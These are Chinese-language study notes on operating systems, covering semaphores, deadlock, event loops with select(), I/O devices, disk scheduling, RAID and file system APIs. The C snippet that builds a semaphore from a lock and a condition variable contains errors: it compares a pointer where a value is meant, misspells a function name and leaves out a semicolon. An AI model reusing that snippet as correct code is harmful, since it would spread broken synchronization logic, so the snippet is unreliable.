问：不知此处为何叫二值信号量，事实上当有多个线程时，信号量的值并不只是在 0 和 1 之间变化，而是有可能会出现负数； 答：被唤醒的线程将直接获得锁，不用再次执行 wait 进行判断（因为之前已经执行过了）；并在执行结束后，对信号量做加1的操作； 当将信号量的初始值设定为 1 时，在临界区的前后调用 sem_wait 和 sem_post 函数的效果，跟上一章的 lock 和 unlock 作用很像，此时信号量发挥的作用跟锁是一样的； 此时信号量扮演的作用非常有趣和巧妙，由于每个线程在进入临界区前，都需要调用 sem_wait 函数尝试获取锁，如果获取不到，就会让自己进入睡眠状态；而当线程从临界区出来的时候，如果有线程在等待，它需要唤醒一个线程，那么这个被唤醒的线程，等同直接获取了锁（此时的信号量有可能依然为负数），而无须做进一步的判断（之前的锁方案有使用 while 进行判断）； 问：如何保证所有的线程都有相同的机会被唤醒，而不会出现某些线程被饿死？ 123sem_wait(&amp;m);// critical section heresem_post(&amp;m); 信号量用作条件变量当将信号量的初始值设定为 0 时，它可以作为条件变量，用于 A 线程调用 sem_wait 函数等待条件满足时，再继续往下执行，而 B 线程负责调用 sem_post 函数改变条件； 生产者&#x2F;消费者问题生产者&#x2F;消费者问题据说也叫做有界缓冲区问题；原因在于除了缓冲区的 empty&#x2F;full 判断外，为了避免多个生产者（或消费者）同时进入 get&#x2F;put 函数，需要对多个生产者之间增加互斥，即每次只能有一个生产者进入 put，或者只有一个消费者进入 get； 此处对 get&#x2F;put 的互斥锁，不再放在 empty&#x2F;full 锁的外面，不然由于它的作用域过大，将直接导致死锁情况发生，即某个线程因为 empty 进入睡眠了，但却仍然持有 mutex 锁，导致后续的线程无法获取锁并将其唤醒；避免作用域过大的做法，即为考虑锁的使用界限，因此称为有界缓冲区问题； 读者-写者锁 不同的数据结构，会面临不同的并发状态，例如链表结构，只有写的并发是需要用到锁的，而读的并发则可以不用锁，因此，如果为不同的数据结构设计不同形式的锁，有利于进一步提高性能； 它的思路是设计两个信号量，一个用来控制读，一个用来控制写，并增加一个当前正在读的线程的计数器；第一个读者需要同时获取读锁和写锁，这样可以避免其他线程在它读的时候，进行写的操作；第二个及以后的读者则无须获取写锁；最后一个退出的读者需要负责释放写锁，以便让写者线程可以有机会进行写的操作； 这个方案虽然可以实现读写分离，但是它有两个问题，一个是写者线程有可能被饿死；二是相比普通单锁的方案，由于多增加了一个锁，性能上其实并没有优势； 启示：复杂的方案不一定更好，有时候简单的笨办法反而不错；Hill 定律：大而笨更好； 哲学家就餐问题 这个问题的有趣之外在于，哲学家们是坐成一圈的，所以一个人的左边，是另一个人的右边。因此如果每个哲学家取叉子的顺序一样的话，将有可能造成循环等待的问题，结果便是死锁；为了避免死锁，需要至少让一个哲学家的取叉子顺序跟别人不同，这样就至少会有一个哲学家能够吃上饭了； 如何实现信号量123456789101112131415161718192021222324252627282930// 使用锁+条件变量的方式，来实现信号量机制typedef struct _zemt_t &#123; int value; pthread_cond_t cond; pthread_mutex_t lock;&#125;void Zem_init(Zem_t *s, int value) &#123; s-&gt;value = value; Cond_init(&amp;s-&gt;cond); Mutex_init(&amp;s-&gt;lock);&#125;void Zem_wait(Zem_t *s) &#123; Mutex_lock(&amp;s-&gt;lock); while(&amp;s-&gt;value &lt;= 0) &#123; // 进入睡眠前会释放锁；唤醒后会持有锁 Cont_wait(&amp;s-&gt;cond, &amp;s-&gt;lock); &#125; s-&gt;value -= 1; Mutex_unlock(&amp;s-&gt;lock);&#125;void Zem_post(Zem_t *s) &#123; Mutex_lock(&amp;s-&gt;lock); s-&gt;value += 1; Cond_signal(&amp;s-&gt;cond); Mutex_unlock(&amp;s-&gt;lock);&#125; 使用锁+条件变量也可以实现信号量，因此信号量看上去有点像是锁+条件变量的一种抽象；它既可以用来替代锁，也可以用来替代条件变量，但是，能否替代成功，跟问题场景密切相关，并不是所有的场景都能够替代成功的；因此，使用信号量时要特别的小心，虽然看似简单了，但效果不一定百分百保证，需要进行更加深入的分析和测试，才能够建立信心； 安全起见，使用原始的锁+条件变量方案，或许是更好的做法； 25.常见并发问题 有哪些常见的并发缺陷？如何处理常见的并发缺陷？ 有哪些类型的缺陷一般有非死锁和死锁两类缺陷，前者占多数； 非死锁缺陷违反原子性缺陷代码原本预期按原子性来执行，但实际的效果并没有实现原子性，A 线程的部分操作在执行到一半的过程中，可能会因为调度产生中断，某些值被新线程 B 修改，导致调度回 A 线程时，其执行环境已经发生了破坏，导致出错； 解决办法：给需要原子性的操作加锁； 错误顺序缺陷B 线程在运行过程中可能假定某个值已经由前面的 A 线程完成了初始化，但实际上，由于调度的随机性，有可能这个时候A 线程还未被调度过，初始化并未完成； 解决办法：引入锁+条件变量+状态变量； 绝大部分的非死锁缺陷（约 97%）都是以上两种类型的缺陷； 死锁缺陷有多个锁，且线程的抢锁顺序不同，导致最终陷入相互等待的境地； 产生的原因 复杂系统中，组件之间很可能存在相互依赖，例如虚拟内存需要通过文件系统访问磁盘读取数据到内存，而文件系统又要访问虚拟内存申请一片内存页，存放相应的数据； 封装：开发人员一般倾向于模块化实现的细节，但是模块化有时无法跟锁很好的契合，导致出现死锁； 产生死锁的条件必须同时满足以下四点 互斥：对于共享的某个资源，线程对其访问存在互斥性，即一次只有一个线程可以抢到访问资源的锁； 持有并等待：线程持有一个资源后，还需要等待抢占其他资源； 非抢占：线程已经获得的资源，不会被其线程抢占； 循环等待：线程之间存在回路，某个线程持有的资源，刚好是下一个线程想要抢占的； 预防的方法循环等待针对循环等待，简单的解决办法就是强制线程对锁的抢占需要按照固定的顺序，比如有两个锁 L1 和 L2，总是先抢 L1，再抢 L2；这样就可以避免两个锁被不同的线程分别持有； 全序：锁少的时候用； 偏序：锁很多的时候用； 持有并等待持有并等待的问题根源于等待的资源可能被占用，因此可以通过增加一个全局锁来解决；所有的线程，必须先抢到这个全局锁后，才可以开始抢占剩下的锁，这样就可以避免存在资源在不同线程手上的问题，但这个方案也有一些缺点 一是降低了并发性，因为现在所有的线程都得等待同一个锁了； 二是不便于封装，据说是因为需要准确的知道需要抢些锁，并提前抢到这些锁（暂时还没有想明白为什么，可能是因为锁需要设置成全局的，无法封装到函数内部里面去）； 非抢占解决思路就是增加一个 trylock 的判断，当暂时无法抢到下一个资源时，就先放弃已经占有的资源；这种方式肯定不会造成死锁，但有可能陷入活锁的问题；就是大家总是让来让去，最后啥进展也没有；为了避免活锁问题，需要引入一个随机等待时间，即等候一个随机时间后，再开始新的一轮循环，这样可以一定程度的降低活锁概率； 互斥互斥性是锁的本质，如果不提供互斥性，锁就没有存在的意义了；如果不用锁，则需要通过利用硬件指令的原子性，来实现原子性的操作，例如比较并互换指令（但是感觉它的应用场景貌似有限？）；但是这种方案有可能会带来活锁问题； 通过调度避免死锁如果我们能够提前知道不同线程可能对锁的需求不同，则只需避免将会有完全重叠锁需求的线程调度到不同 CPU 上同时运行即可；不过这种方案有硬伤，一是它极大的降低了性能；二是我们需要提前知道所有的任务，并知道它们各自需要什么样的锁，这样才可以设计出调度的方案； 示例一： 示例二： 检查和恢复最后一个不是办法的办法是允许死锁发生，然后定期做一次检查，如果发生停滞了，就做一次重启；很多数据库采用了这个方案； 26.基于事件的并发基本思路事件处理程序一开始啥也不做，坐等事件的到来；它轮询事件队列，获取待处理的事件，然后依次处理 123456while (1) &#123; events = getEvents(); for (e in events) &#123; processEvent (e); &#125;&#125; select() API 介绍操作系统提供了一个 select 系统调用函数来实现基于事件循环的并发；它的原理也很简单，该系统调用接收一堆文件描述符的集合和待检查的数量上限；之后操作系统在该数量上限内，依次逐一检查每个文件描述符（包括读、写、错误三类），看某个描述符是否已经进入了就绪的状态；最后，将所有已经处于就绪状态的文件描述符组成一个列表返回； 问：为什么要引入一个上限？ 1234567int select ( int nfds, // 待检查文件描述符数量上限 fd_set *restrict readfds, // 读 fd_set *restrict writefds, // 写 fd_set *restrict errorfds, // 异常 struct timeval *restrict timeout // 检查时间，超时后返回；若为 NULL 则在未找到任何就绪的描述符前先阻塞；若为 0 则马上返回); 使用 select()建立一个无限循环，在循环开始时，初始化并准备好一个文件描述符的集合，然后调用 select，将集合送进去检查；如果某个描述符已经进入了就绪状态，select 会对其进行标记；当 select 标记完毕返回完；再依次遍历集合中的每个描述符，看其标记是否改变，若改变，表示该描述符已经就绪，因此可调用相同的函数，对其进行处理； 由于只剩下一个线程在处理事件，因此基于事件的并发处理机制，就暂时不需要锁了，因为不存在线程之间的冲突；不过当 CPU 不止一个时，如果想利用多核 CPU，则有可能会存在冲突； I&#x2F;O 异步如果应用程序发起的操作，仅仅在 CPU 层面就可以完成的话，事件机制是没有任何性能问题的；但是如果某个操作涉及 CPU 之外的操作，例如对 I&#x2F;O 设备的访问，由于这些设备很慢，将导致 CPU 要等待很长时间才能得到结果，这将导致严重的性能下降，因为 CPU 的时间片大量闲置；仅仅有 select 调用，还不足以让基于事件的机制应付各种业务场景，需要引入一些新的操作系统接口来完善它； 早期操作系统对 I&#x2F;O 设备发起的请求是同步的，为了支持基于事件的并发，现代操作系统开始提供异步的 IO 请求接口；应用程序调用该接口，发起 IO 请求，但在请求完成之后，操作系统又会马上将控制权返回给应用程序； 当 IO 请求中的动作完成后，此时有两种机制可以通知应用程序： 应用程序定期轮询的 IO 请求队列，查看是否有某个请求已经就绪；该方案的缺点是成本过高； 请求完成后，发出中断信号给应用程序，应用程序再进行处理；优点：性能好； 状态管理当一个异步的 IO 请求进入就状态后，应用程序需要知道如何处理该请求的结果，因为应用程序可能在之前已经发起过很多个 IO 异步请求，每一个请求的结果可能需要使用不同的方式进行处理；为了能够让请求结果和处理方式一一对应，一种办法是在发起请求的时候，将相应的结果处理方式，也记录在文件描述符的某个属性中，这样当请求结果返回时，就可以在文件描述符中查找到该属性，获得对应的结果处理办法； 仍然存在的问题 无法利用多核CPU：虽然单线程的机制避免了使用锁带来的麻烦，但是单线程无法利用多核的 CPU 来提高性能；如果针对每个 CPU 各开一个线程，则线程之间将不可避免会遇到临界区冲突的问题； 部分系统调用非异步：当某个非异步的系统调用发生错误时，例如发生了页错误，由于应用程序是单线程的，此时将导致整个应用程序被阻塞挂起，无法做出响应； 可能会累积复杂性：基于事件的代码引入了一些复杂性，随着时间的推移，这些代码的复杂度将逐渐累积，可能会给后续增加代码管理成本； 基于事件的并发机制并不是万能药，或许暂时较为可行的解决方案之一，是将应用程序设计成无状态的，这样就可以充分利用多核的CPU，甚至是多个机器节点；而将有状态的数据，交给其他的应用程序如数据库进行管理；数据库来负责原子性的部分； 27.I&#x2F;O 设备 问题：I&#x2F;O 显然是非常重要的，那要如何将 I&#x2F;O 集成到系统中？常见的机制是什么？如何让其变得高效？ 系统架构不同的设备使用不同速度规格的总线相连，取得成本和速度之间的折中平衡； 标准设备计算机是由多种设备组合在一起协同工作的，设备与设备之间需要相互配合协作；因此，每个设备都需要定义一套自己的接口和交互协议，以便别人可以调用它提供的功能；而在设备内部，设备需要负责接口所代表的功能的具体实现；实现的办法同样包括拥有自己的微处理器、通用内存、完成特定功能的芯片等； 标准协议12345678while (STATUS == BUSY) ; // 轮询等待，直到设备空闲write data to DATA register // 设备空闲时，向设备DATA寄存器写入数据write command to COMMAND register // 向设备的 COMMAND 寄存器写入指令，之后设备开始按指令处理数据while (STATUS == BUSY) ; // 轮询等待设备处理完毕get data or status from register // 处理完毕后，从设备的寄存器读取状态和数据 标准协议的交互逻辑还是很简单的，问题在于太过于低效，因为 CPU 要在整个时间片里面不断轮询，浪费了很多无谓的时间； 利用中断减少 CPU 开销减少 CPU 开销的一个办法是引入中断机制，让设备处理完毕后，可以给 CPU 发一个中断信号，之后 CPU 就可以调用提前映射好的中断处理程序，处理设备计算结果； 中断机制并非在所有情况下都是最好的方案，它比较适用于与计算速度比较慢的设备进行协作的场景中；如果设备的计算速度很快，在收到命令后能够很快给出结果，则中断并没有太大意义，反而增加了切换的成本，此时传统的轮询机制的性能反而更好； 但是有时候并不知道设备的处理速度有多快，一个折中的办法是引入混合模式，即 CPU 在发送完指令给设备后，就尝试轮询一小段时间，如果在该时间内设备仍然未处理完毕，CPU 就切换到其他线程； 网络场景也不适合完全使用中断，因为服务器有可能在短时间内收到大量的请求，如果只用中断机制，将使得 CPU 疲于应付大量的中断信号，而无暇处理真正的请求内容；此时适当配合使用轮询反而效果更好，CPU 可以通过轮询的方式接收一批请求的数据包，然后专心处理它们；处理完之后，再轮询网卡，处理下一批请求的数据包； 另外也可以在设备层面对中断机制进行优化，设备不再是一处理好马上发出中断，而是可以稍等一小段时间，先继续处理一些请求，因为它们有可能也很快可以完成；之后再一次性的发起一次中断；通过将多个中断合并成一个中断，也可以降低中断的性能代价； 问题：当 CPU 收到设备发过来的中断信号后，由于此时 CPU 有可能已经切换到其他线程，CPU 如何知道中断信号是属于哪个线程的？ 答：猜测 CPU 并不需要知道，它只要把信号转发给操作系统就好了，由于操作系统负责做好映射表，查询某个设备之前是由哪个线程调用的；此时操作系统负责唤醒该线程； 利用 DMA 更高效的传输数据当 CPU 在跟设备交互的时候，有一个环节是需要向设备写入或读取数据，这个动作本身也是需要时间的，但是它是非常简单的数据读取或拷贝，并不需要什么计算能力，因此让 CPU 来做这个工作有点屈才和得不偿失；为了避免这个问题，通过引入 DMA（direct memory access）机制，给 CPU 减轻工作压力，让它去处理其他更高价值的工作； 当进入读写数据的环节时，CPU 就发送相关的指令给 DMA，包括数据在内存中的位置，数据的大小，数据的目的地等信息；之后 CPU 开始去做其他的工作，而 DMA 就负责接下来的数据传输工作； 操作系统与设备交互的方法 问：操作系统用什么方式跟设备发生交互？例如从设备读取数据，或者向设备写入数据？ 方法一：I&#x2F;O 指令CPU 提供了一些 I&#x2F;O 指令供操作系统调用；当操作系统想要向某个设备写入数据时，就调用该指令，指定设备的某个寄存器（设备存放数据的地方），指定端口号（代表某个特定的目标设备）；CPU 在收到指令后，执行向设备写入数据的操作； 这些 I&#x2F;O 指令都是特权指令，只有操作系统才有权调用，普通程序无权调用； 方法二：内存映射 I&#x2F;O操作系统不直接与设备的寄存器打交道，而是将设备的寄存器映射到虚拟内存地址空间中，用某个虚拟地址代表它；当需要向设备写入数据时，操作系统调用的指令跟平时写入虚拟内存时一样；CPU 在收到该指令后，通过映射表找到实际的设备寄存器地址，然后向设备的寄存器写入数据（内存映射的一个好处是 CPU 不需要单独设计额外的指令集，仅使用原有的指令集就可以了）； 问：映射关系记录在哪里？ 答：莫非 CPU 的 TLB 里面有专门的地方用来记录这个东西？ 纳入操作系统：设备驱动程序操作系统由很多个子系统构成，每个子系统都可能与设备打交道，显然让每个子系统都直接去调用设备的交互接口并不是一个好主意，因为当某个设备发生变动时，导致所有子系统都需要做出调整；更好的办法，是让部分模块专门负责与某个特定设备进行交互，由它负责具体的交互实现细节；而系统中的其他模块，只要直接调用该模块提供的接口就好了；（这其实就是简单又强大的抽象分层技术）； 某个具体实现与特定设备进行交互的模块，即是常说的设备驱动程序； 这种架构也有一点缺点，即如果某个比较新款的设备提供了一些市面上不常见的特殊功能，由于通用块接口的开发或者某个系统软件（如文件系统）的开发还没有跟上，暂未实现调用该特殊功能的接口给应用程序，将导致应用程序实际并无法使用到设备提供的最新功能； 此时貌似需要操作系统尽快推出补丁了？ IDE 磁盘驱动程序示例IDE 硬盘包括以下寄存器： 控制寄存器：1个； 命令寄存器：8个； 状态寄存器：1个； 错误寄存器：1个； 驱动程序与设备的交互过程大概如下： 等待设备就结绪：通过查看设备的状态寄存器获得是否就绪的信息； 写入命令参数：向设备的命令寄存器写入参数：写入的内容包括扇区数、逻辑块地址、磁盘编号（因为同一条 IDE 线支持挂载两个硬盘）； 写入命令：向设备的命令寄存器写入命令，以便配合上一步的参数，让磁盘实现具体的操作； 数据传送：等待，直到设备的状态寄存器的值再次更新为 READY 和 DRQ 时，向设备的数据寄存器写入数据； 中断处理：正常情况下，每个扇区的数据传送结束后，都会触发一次中断，以便调用相应的中断处理程序； 错误处理：每次操作后，都检查一下错误寄存器，就触发错误处理程序； 28.磁盘驱动器 问题：现代磁盘驱动器是如何存储数据的？接口是什么？数据是如何安排和访问的？磁盘调度如何提高性能？ 基本单位磁盘驱动器的最小单位是扇区，每个扇区默认为 512 字节；每一次操作都是什么一个扇区的原子性操作，要么全部写入，要么全部没有写入；整个磁盘被划分为 n 个扇区，相当于一个由 n 个元素组成的数组；地址空间（即地址编号范围）由 0 到 n-1 组成； 虽然有些文件系统支持以 4KB 为单位的读取和写入，但实际上在底层仍然是以 512 字节为单位的；这意味着 4KB 的操作并非原子性的，如果在读写过程中发生断电，有可能导致 4KB 的数据只写了一部分； 基本几何形状由大到小：盘片-&gt;表面-&gt;磁道-&gt;扇区；表面上的磁道很多，几百个磁道加起来也只有一根头发的粗细，因此整个表面拥有成千上万的磁道；由于越外围的磁道，周长越大，因此如何分配跟内围的磁道相同的扇区数的话，显然会造成极大的浪费；因此，一般将表面分成多个区域，相同区域内的磁道，虽然周长不同，但扇区数相同；不同区域的磁盘，扇区数不同，以最大化利用磁盘表面的空间进行数据存储； 缓存机制寻道时间和旋转延迟是磁盘 I&#x2F;O 操作中时间成本最高的两个操作；为了降低每次读写数据的时间成本，磁盘通常会引入缓存机制，即并不是精准读取指定扇区的数据，而是将整个磁道多个扇区的数据一起读取出来，放到缓存中；由于局部性原理，接下来这些数据有很大概率被访问，从而避免了第二次的寻道和旋转时间； I&#x2F;O 时间对于随机访问和顺序访问两种场景来说，磁盘性能差距巨大，可能有 200-300 倍左右的差距；随机访问可能才 0.5M&#x2F;s，而顺序访问可以达到 100M&#x2F;s； 调度策略相对于任务调度，磁盘调度有一个好处是可以大概估算完成操作所需要的时间，假设操作系统收到多个磁盘调度的请求，由于可以大致计算每个调度的用时，因此可以使用一些调度策略来提高调度性能； 最短寻道时间优先操作系统可以根据请求的扇区地址，计算出各个请求与当前位置的远近顺序，优先服务最近的请求，延后服务最远的请求；这样可以避免浪费时间在寻道上面；缺点：有可能导致最远磁道的请求饿死； 电梯扫楼策略这个策略很像到写字楼发传单的场景，推广人员乘坐电梯，将底层到顶层，将每一层楼扫一遍；扫完之后，如果还有没有新进来的待处理请求，再从最顶层到最底层扫一遍，以此类推； 这个方法的好处是可以避免某些请求饿死，但它仍然不是最优的算法，因为它没有考虑旋转延迟的成本； 最短定位时间优先这个策略的优点是将旋转延迟的成本也考虑进来了，以最短的寻道时间+旋转时间之和作为调度的顺序；但是理想很丰满，现实很骨感；因为磁盘的规格型号很多，操作系统并不知道所要寻找的扇区在磁盘表面的位置，因此也无法估算出旋转时间；所以，这个策略并不适合操作系统，但适合在磁盘内部来实现；因为每个磁盘生产商在生产磁盘的时候，各项参数是已知的； 双重调度在早期，磁盘的调度是由操作系统来完成的，但为了取得更好的性能，现在改成了由操作系统和磁盘二者共同完成；操作系统挑选一批自认为不错的请求发给磁盘（例如会合并一些扇区相近的请求），磁盘使用内置的调度程序，以最快的策略处理请求并返回结果； 一般来说，操作系统并不是一收到应用程序的 I&#x2F;O 请求，就马上将它发给磁盘，而是会稍微等一小段时间，让更多的请求进来后，再开始调度； 29.廉价的冗余磁盘 问：数据除了能够更快的访问外，如何解决可靠性问题，避免意外丢失？ RAID 的全称竟然是 Redundant Array of Inexpensive Disk，翻译一下：廉价的冗余磁盘组； RAID 的思想很像单独组建一套由多个磁盘、内存、1个或多个处理器组成的计算机系统，这套系统的专职工作即是完成数据的存储和管理；它有如下的优点： 增加了可靠性，即使有一个磁盘不工作了，也不会导致数据的丢失； 提高了性能，原来的 I&#x2F;O 请求需要排队逐个处理，现在可以分散给多个磁盘并发处理； 接口和 RAID 内部RAID 对外暴露的接口跟普通的磁盘完全一样，这就使得它的部署和使用变得没有成本，不需要改动操作系统或应用程序，即可以像使用普通磁盘那样使用 RAID 磁盘； 但实际上 RAID 内部是相当复杂的，它接近等同一个独立的计算机系统，有自己的内存、处理器和磁盘；当它接收到外部的逻辑请求后，对该请求进行换算，映射成物理请求，然后发给磁盘进行处理； 故障模型RAID 本质上主要还是为了提高可靠性，因此需要对现实世界中可能发生的故障类型进行建模，常见的有如下几种类型的故障： 故障-停止：磁盘出现故障，然后不工作了； 磁盘损坏 扇区错误 如何评估 RAIDRAID 有多种设计实现方案，分别对应满足不同的业务需求，有些侧重可靠性，有些侧重性能，因此一般有三个评估的维度： 性能； 可靠性 容量； RAID 0级：条带化条带化的思想是将扇区按顺序轮流放在每个磁盘上，示例如下： 块的大小以多大的块作为最小的单位，轮流存储在每个磁盘上，是一个设计时需要权衡的问题；块越小，则文件访问的并行性越好；但是同时会增加寻道和旋转成本；因此并不存在最佳方案，完成取决于主要应用在何种业务场景；一般来说，大多数使用 64KB 的块大小； 优点：性能好、容量大； 缺点：可靠性差，因为任一磁盘故障都将导致数据丢失； RAID 1级：镜像镜像的原理是将同一份数据在两个或多个磁盘上各存储一个副本；它的好处是增加了可靠性，即使有一个磁盘发生了故障，也不会导致数据丢失，由于可以并发的读写，因此性能上也没有损失；缺点是损失了容量； 镜像在写入数据的时候，需要同时更新两个或多个磁盘，如果此时其中一个磁盘发生断电，没有写入成功，最后将导致各个磁盘存储的数据不一致；为了解决这个问题，RAID 1 引入了一个小小的非易失性的 RAM，用来预写日志；这样如果万一有某个操作被意外中断没有完成，仍然可以通过日志在后续弥补； 前面说性能没有损失有点错误，实际上性能在不同场景下有些差异： 顺序读：N * S &#x2F; 2 顺序写：N * S &#x2F; 2 随机读：N * R 随机写：N * R &#x2F; 2 此处 N 表示磁盘的数量，S 表示顺序，2 表示副本数量，R 表示随机，单位为 M&#x2F;s RAID 4级：通过奇偶校验节省空间由于 RAID 1级非常浪费空间，RAID 4 级准备在这个维度上进行改进；它的思路是在普通磁盘上使用异或算法得到计算结果，并增加一个磁盘用来存储该异或结果； 这样当某个磁盘出错时，可以跟剩余磁盘的位+校验磁盘位，再次异或，得到丢失的位的值； 这个算法很机智，不过 RAID4 最大只能允许一个磁盘出错，如果有2个或多个以上的磁盘出错，就恢复不了了； 各个场景下的性能分析： 顺序读：(N - 1) * S 顺序写：(N - 1) * S 随机读：(N - 1) * R 随机写：R &#x2F; 2，看起来确实很糟糕，因为只有一个校验磁盘，这意味着对任何普通磁盘的写入，都必须汇总到校验盘的读写上面，而它又需要先做一次读，再做一次写，才能完成一个逻辑写入，因此性能下降为单个磁盘的一半； RAID 5 级：旋转奇偶校验为了解决 RAID4 在随机小写入场景中性能糟糕的问题，引入了 RAID 5级，它的思路是不再将奇偶位单独存储在一个磁盘上，而是像普通数据一样，加入轮转的队列；根据顺序，依次存放在不同的磁盘上，例如 P0 在编号磁盘4，P1 在磁盘3，P2 在磁盘2，以此类推； 由于奇偶位引入了轮转存储的机制，因此随机小写入的性能会有所提升，达到约 N * R &#x2F; 4 MB&#x2F;s； 此处有 4 倍的损失原来在于每个小写入，都将导致两次读取 + 两次写入； 总结：不同的 RAID 方案用以实现不同的目标 性能+容量：条带化 RAID0 性能+可靠性：镜像 RAID1 容量+可靠性：RAID5，牺牲一点点随机写入场景下的性能； 30.插叙：文件和目录 问：操作系统应该如何管理文件和存储设备？需要给应用程序提供哪些API？实现环节有哪些注意事项？ 文件和目录文件和目录是操作系统提供给用户关于管理存储数据的一种抽象；文件和目录都有一个自己的编号（inode号），同时还有一个方便用户阅读识别的名称（名称通常可以由用户任意指定，只要不包含一些限制符号）；目录可以用来组织文件的存储结构； 文件在本质上是一个字节的连续数组，每个字节都可以被单独的读取和写入；操作系统实际上只在磁盘上存储或读取该字节数组，它并不关心里面的内容是什么，内容的解析交由应用程序自己来处理； 文件系统接口操作系统提供了一些接口（即系统调用），让应用程序能够进行调用以完成对文件的操作； 创建文件应用程序通过调用 open 接口实现文件的创建，同时传入一些参数，来指定所创建文件的相关要求； 1234int fd = open(&#x27;foo&#x27;, O_CREAT | O_WRONLY | O_TRUNC);// 其中参数 O_CREAT 表示创建新文件，O_WRONLY 表示仅写入，O_TRUNC 表示如果有同名文件，删除其中的内容；// 返回值 fd 是一个文件描述符，它相当于一个指向新创建文件的指针，通过它可以实现后续对文件的写入或读取操作；// fd 是每个进程私有的；不同进程的不同 fd，有可能实际上背后指向的是同一个文件 读写文件：从头开始基本过程： open 某个文件，得到文件描述符； read 该文件描述符，并指定缓冲区大小； write 将缓冲区内容写到目标位置（另一个文件描述符），例如屏幕（标准输出，它的文件描述符一般是 1）； 再次循环 read 和 write，直到文件中没有剩下内容（返回 0）； close 文件； 读写文件：从中间开始lseek 系统调用允许应用程序从文件的中间某个指定位置开始读写操作，并一定非得从头开始； 12345off_t lseek(int fd, off_t off_set, int whence);// off_set 表示偏移量, whence 表示偏移的方式，分别有如下几种情况：// SEEK_SET：从头部开始，偏移 off_set 字节；// SEEK_CUR：当前位置，偏移 off_set 字节；// SEEK_END：从尾部开始，偏移 off_set 字节； 用 fsync() 立即写入正常情况下，当应用程序调用 write 接口将数据写入文件后，操作系统并不是立即去执行这个动作，而是会将待写入数据暂时放在内存缓冲区中，每隔一段固定的时候，再统一向磁盘写一次；这样做的原因是为了提高磁盘的使用性能； 但是有些业务场景需要数据马上写入，例如数据库程序，因此，操作系统有额外提供 fsync() 接口，供应用程序调用； 文件重命名在 Linux 系统下，mv 接口提供了修改文件名的功能，它背后实质上是调用了 rename 接口；rename 接口有一个特性，即它的操作是原子性的，这样做的目的在于避免奇怪的中间状态，导致数据最后丢失，例如重命名的过程当中突然停电了，如果没有原子性，将导致文件即不是原来的名称，也不是新的名称，最后用户找不到了； 获取文件信息除了文件内容外，通常还需要保存一些文件本身的相关信息，即所谓的文件元数据（或者叫头部信息），可以通过 stat 或 fstat 接口来查看；文件系统一般将这些信息存储在一个叫做 inode 的数据结构中，通常包含如下信息： 好奇这里面怎么好像没有文件名称的信息？ 删除文件表面上看，删除文件的接口是 rm，但通过 strace 跟踪可以发现它背后实质上调用的是 unlink； 创建目录创建目录的接口熟悉的老朋友 mkdir；但目录并不能像文件一样被直接写入内容，它的格式在本质上是一堆文件系统元数据，需要使用间接更新的方式（在目录下面创建文件或子目录），来写入一些内容； 这意味着在目录中创建文件或者子目录时，会同时修改目录节点的内容； 目录刚创建的时候，其实含有两个内容条目，一个是引用自身的条目（点目录），一个是引用父级目录的条目（点点目录）； 读取目录读取目录的接口是也一位老朋友：ls；由于目录本身包含的信息很少，只有文件或子目录名称，以及它们的 inode 编号；这意味着当我们使用 -l 选项让 ls 展示更多信息时，它背后实质上是调用了 stat 来获取每个条目的元数据来得到最终结果； 删除目录接口为 rmdir，但是由于这个操作可能涉及将目录中的大量文件删除，是个危险动作；因此一般要求目录为空时，才允许执行（其实这个时候也不完全是空的，里面至少还有点和点点两个条目）； 硬链接link 系统调用可以将一个新文件的名称，链接到某个旧文件名称上；背后的本质其实是让两个文件名称指向同一个 inode 编号；所以文件实质上仍然只有一个，只是名称有了两个； 当我们使用 open 创建一个文件时，操作系统实际上做了两个动作，一个是初始化一个 inode 结构，用来保存文件的元数据；另一个是在目录中增加一个新条目，将某个文件名称，链接到该 inode 结构； 在 inode 结构中有一个引用计数的字段，它用来记录当前有多少个文件名称条目引用到自己，当引用计数为零时，文件系统就会释放存储空间，从而真正的删除文件； 符号链接符号链接也叫软链接，它出现的目的在于解硬链接存在的一些局限性，例如： 不能创建目录的硬链接，因为可能会造成循环引用； inode 编号仅在单个文件系统中是唯一的，在不同的文件系统中则不是；而一个操作系统下通常有多个文件系统（每个文件系统对应一个磁盘分区）； 软链接表面上用起来好像跟硬链接一样，但背后有本质性的不同，它实现上并不是为新文件名增加一个引用条目，而是增加一个文件名的映射，即将新文件名映射到旧文件名；因此软链接的大小取于旧文件名有多长，旧文件名越长，则软链接的大小越大； 软链接相当于给旧的文件名起一个新昵称！ 由于软链接实际上只是文件路径的映射，因此它并不会改变 inode 中的引用计数，这将导致出现悬空引用，即文件可能已经实质上删除了，但软链接仍然存在；这时如果对它进行访问，就会提示失败，找不到文件； 创建并挂载文件系统 问：什么是文件系统？ 答：看上去，文件系统好像是指管理文件的一种方式；文件系统有很多种类型，例如 ext3, ext4, tmpfs, sysfs, NTFS,FAT32, 等；不同类型的文件系统，背后存储和管理数据的方式不同，各有其优缺点；当我们给磁盘进行分区的时候，需要指定使用的格式，其实此时就是在指定文件系统类型；因此一个操作系统中，可能会有多个文件系统类型；但一个磁盘分区只使用一种文件系统类型； 挂载文件系统的接口是 mount，每个文件系统都有自己的根目录，但是通过 mount，可以将各个文件系统统一集成到一个大的目录树项下，而不是多个独立的目录树，这让命名变得统一和方便了起来； 31.文件系统实现CPU 和内存的虚拟化都需要配合硬件才能够实现，但文件和目录的虚拟化（即文件系统）不同，它是一个纯软件，并不需要硬件的配合； 问：如何构建一个文件系统？磁盘上需要存储什么数据结构？它们需要记录什么？它们如何访问？ 实现决策 文件系统采用何种数据结构； 文件如何被访问； 整体组织 先将磁盘按固定大小分成多个块（一般大小为 4KB，块跟扇区有点类似，但一个是在文件系统中虚拟的，一个是在物理磁盘中虚拟的），每个块拥有自己的地址；磁盘变成一个由 n 个块组成的数组；每个块作为最小的存储单位，因此磁盘此时最多可以存储 n 个文件； 由于每个文件都有一个 inode 数据结构用来保存文件的元信息；因此磁盘上还需要划分一个区域用来存储 inode 表；每个 inode 条目此处假设固定分配 256 字节的空间；因此一个 4KB 的块，可以存储 16 个 inode 条目；如果磁盘最多可以存放 n 个文件，意味需要 n &#x2F; 16 个块，用来存放 inode 表； 使用位图来标记其映射的 inode 块或者数据块是否空闲，还是已分配； 使用一个块（称为超级块）来存储关于当前磁盘上的文件系统的一些元信息，例如 inode 块数量、数据块数量、inode 表的起始位置、文件系统类型等； 问：inode 表一开始就已经固定大小了吗？还是随着存储文件的增多，其大小是动态变化的？ 文件组织：inode对于文件系统来说，它是通过 inode 来标识和管理文件的，只要给它一个 inode 索引号，它就可以通过 inode 表找到该 inode 的相关信息，从而知道文件的具体信息； 